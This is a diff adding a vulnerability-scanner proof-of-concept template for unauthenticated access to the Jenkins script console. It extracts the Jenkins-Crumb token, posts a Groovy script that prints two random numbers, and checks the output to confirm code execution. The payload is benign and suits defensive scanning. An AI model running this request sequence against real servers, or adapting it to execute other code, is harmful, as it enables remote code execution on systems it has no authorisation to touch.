@@ -1,0 +1,21 @@
+name: poc-yaml-jenkins-unauthorized-access
+set:
+  r1: randomInt(1000, 9999)
+  r2: randomInt(1000, 9999)
+rules:
+  - method: GET
+    path: /script
+    follow_redirects: false
+    expression: response.status == 200
+    search: |
+      "Jenkins-Crumb", "(?P<var>.+?)"\);
+  - method: POST
+    path: /script
+    body: |
+      script=printf%28%27{{r1}}%25%25{{r2}}%27%29%3B&Jenkins-Crumb={{var}}&Submit=%E8%BF%90%E8%A1%8C
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r1) + "%" + string(r2)))
+detail:
+  author: MrP01ntSun(https://github.com/MrPointSun)
+  links:
+    - https://www.cnblogs.com/yuzly/p/11255609.html
+    - https://blog.51cto.com/13770310/2156663
